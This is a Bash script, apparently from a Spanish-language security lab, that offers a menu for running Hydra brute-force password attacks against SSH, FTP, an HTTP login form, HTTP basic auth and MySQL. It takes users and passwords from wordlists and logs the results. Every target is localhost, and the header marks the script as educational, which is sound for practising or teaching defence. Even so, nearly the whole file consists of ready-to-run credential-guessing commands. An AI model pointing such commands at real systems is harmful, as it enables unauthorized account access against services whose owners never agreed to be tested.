#!/bin/bash

# Script de Ataques con Hydra - Menú Interactivo
# Solo para fines educativos

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORDLIST_DIR="$PROJECT_DIR/wordlists"
LOG_DIR="$PROJECT_DIR/logs"

mkdir -p "$LOG_DIR"

show_menu() {
    clear
    echo -e "${CYAN}╔════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║   LABORATORIO DE ATAQUES CON HYDRA    ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}1.${NC} Ataque SSH Node 1 (Puerto 2222)"
    echo -e "${YELLOW}2.${NC} Ataque SSH Node 2 (Puerto 2223)"
    echo -e "${YELLOW}3.${NC} Ataque FTP (Puerto 21)"
    echo -e "${YELLOW}4.${NC} Ataque HTTP Form (Puerto 5000)"
    echo -e "${YELLOW}5.${NC} Ataque HTTP Basic Auth (Puerto 8080)"
    echo -e "${YELLOW}6.${NC} Ataque MySQL (Puerto 3306)"
    echo -e "${YELLOW}7.${NC} Ejecutar TODOS los ataques"
    echo -e "${YELLOW}8.${NC} Ver logs"
    echo -e "${YELLOW}0.${NC} Salir"
    echo ""
    echo -n -e "${GREEN}Selecciona una opción: ${NC}"
}

attack_ssh() {
    local port=$1
    local node=$2
    echo ""
    echo -e "${BLUE}[*] Ataque SSH - $node (Puerto $port)${NC}"
    echo -e "${YELLOW}[*] Iniciando fuerza bruta...${NC}"
    
    hydra -L "$WORDLIST_DIR/users.txt" \
          -P "$WORDLIST_DIR/passwords.txt" \
          -s $port -t 4 -V -f \
          ssh://localhost 2>&1 | tee "$LOG_DIR/ssh_${node}_$(date +%Y%m%d_%H%M%S).log"
    
    echo ""
    read -p "Presiona ENTER para continuar..."
}

attack_ftp() {
    echo ""
    echo -e "${BLUE}[*] Ataque FTP${NC}"
    
    hydra -L "$WORDLIST_DIR/users.txt" \
          -P "$WORDLIST_DIR/passwords.txt" \
          -t 4 -V -f \
          ftp://localhost 2>&1 | tee "$LOG_DIR/ftp_$(date +%Y%m%d_%H%M%S).log"
    
    echo ""
    read -p "Presiona ENTER para continuar..."
}

attack_http_form() {
    echo ""
    echo -e "${BLUE}[*] Ataque HTTP Form (Flask)${NC}"
    
    hydra -L "$WORDLIST_DIR/users.txt" \
          -P "$WORDLIST_DIR/passwords.txt" \
          -t 4 -V -f localhost -s 5000 \
          http-post-form "/login:username=^USER^&password=^PASS^:incorrecta" \
          2>&1 | tee "$LOG_DIR/http_form_$(date +%Y%m%d_%H%M%S).log"
    
    echo ""
    read -p "Presiona ENTER para continuar..."
}

attack_http_basic() {
    echo ""
    echo -e "${BLUE}[*] Ataque HTTP Basic Auth${NC}"
    
    hydra -L "$WORDLIST_DIR/users.txt" \
          -P "$WORDLIST_DIR/passwords.txt" \
          -t 4 -V -f localhost -s 8080 \
          http-get / 2>&1 | tee "$LOG_DIR/http_basic_$(date +%Y%m%d_%H%M%S).log"
    
    echo ""
    read -p "Presiona ENTER para continuar..."
}

attack_mysql() {
    echo ""
    echo -e "${BLUE}[*] Ataque MySQL${NC}"
    
    hydra -L "$WORDLIST_DIR/users.txt" \
          -P "$WORDLIST_DIR/passwords.txt" \
          -t 4 -V -f \
          mysql://localhost 2>&1 | tee "$LOG_DIR/mysql_$(date +%Y%m%d_%H%M%S).log"
    
    echo ""
    read -p "Presiona ENTER para continuar..."
}

view_logs() {
    echo ""
    echo -e "${BLUE}[*] Logs disponibles:${NC}"
    echo ""
    ls -lh "$LOG_DIR" 2>/dev/null || echo "No hay logs disponibles"
    echo ""
    read -p "Presiona ENTER para continuar..."
}

while true; do
    show_menu
    read option
    
    case $option in
        1) attack_ssh 2222 "node1" ;;
        2) attack_ssh 2223 "node2" ;;
        3) attack_ftp ;;
        4) attack_http_form ;;
        5) attack_http_basic ;;
        6) attack_mysql ;;
        7)
            echo -e "${CYAN}Ejecutando todos los ataques...${NC}"
            attack_ssh 2222 "node1"
            attack_ssh 2223 "node2"
            attack_ftp
            attack_http_form
            attack_http_basic
            attack_mysql
            echo -e "${GREEN}Todos los ataques completados${NC}"
            read -p "Presiona ENTER para continuar..."
            ;;
        8) view_logs ;;
        0) echo -e "${GREEN}Saliendo...${NC}"; exit 0 ;;
        *) echo -e "${RED}Opción inválida${NC}"; sleep 2 ;;
    esac
done
